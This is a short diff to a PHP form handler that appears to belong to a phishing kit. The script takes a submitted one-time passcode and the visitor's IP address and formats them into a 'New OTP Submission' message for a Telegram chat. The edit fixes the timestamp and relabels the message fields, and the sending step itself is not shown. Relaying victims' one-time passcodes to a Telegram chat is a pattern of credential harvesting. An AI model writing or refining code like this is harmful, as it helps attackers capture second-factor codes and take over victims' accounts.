@@ -17,13 +17,14 @@ if ($_SERVER["REQUEST_METHOD"]=="POST"){
 // Get and define form inputs
     $userotp = htmlspecialchars($_POST['userotp'] ?? '? ? ?');
     $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
-    $time = NOW();
 
+    // Generate timestamp
+    $timestamp = date("Y-m-d H:i:s");
 
 // Define message structure before sending to Telegram
 $telegram_message = "📝 *New OTP Submission*:\n\n".
-                    "👤 *Userotp:* $userotp\n".
-                    "  *Time:* $time\n".
+                    "👤 *OTP:* $userotp\n".
+                    "⏳ *Submitted At:* $timestamp\n".
                     "💬 *IP:* $ip";
                     
 
